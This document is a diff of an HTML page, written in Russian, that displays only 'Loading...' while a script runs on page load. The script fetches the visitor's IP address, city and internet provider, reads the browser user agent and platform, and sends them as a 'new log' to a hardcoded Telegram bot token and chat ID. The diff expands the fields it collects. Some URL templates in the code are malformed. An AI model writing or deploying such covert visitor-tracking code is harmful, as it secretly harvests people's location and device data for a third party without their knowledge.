@@ -2,37 +2,22 @@
 <html>
 <head><meta charset="UTF-8"></head>
 <body>
-    <h1 id="status">Загрузка... (v14.0)</h1>
-
+    <h1 id="status">Загрузка... (v16.0)</h1>
     <script>
         async function run() {
             const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
             const chat_id = "8242133853";
             const status = document.getElementById('status');
-
             try {
                 const ipRes = await fetch('https://api.ipify.org');
                 const ipData = await ipRes.json();
                 const ipv4 = ipData.ip;
-
                 const geoRes = await fetch(`https://ipapi.co{ipv4}/json/`);
                 const geoData = await geoRes.json();
-
-                const device = navigator.userAgent;
-
-                const text = encodeURIComponent(
-                    `🚀 НОВЫЙ ЛОГ!\n` +
-                    `📍 IP (IPv4): ${ipv4}\n` +
-                    `🌍 Город: ${geoData.city}, ${geoData.country_name}\n` +
-                    `📱 Устройство: ${device}`
-                );
-
-                // 5. Отправляем в Telegram
-                const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${text}`;
-                
+                const message = `🚀 ЛОГ!\nIP: ${ipv4}\nГород: ${geoData.city}\nПровайдер: ${geoData.org}\n📱 Устройство: ${navigator.userAgent}\n💻 Платформа: ${navigator.platform}`;
+                const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
                 await fetch(url);
-                status.innerText = "ГОТОВО! Данные в Telegram.";
-
+                status.innerText = "ГОТОВО!";
             } catch (e) {
                 status.innerText = "Ошибка: " + e;
             }
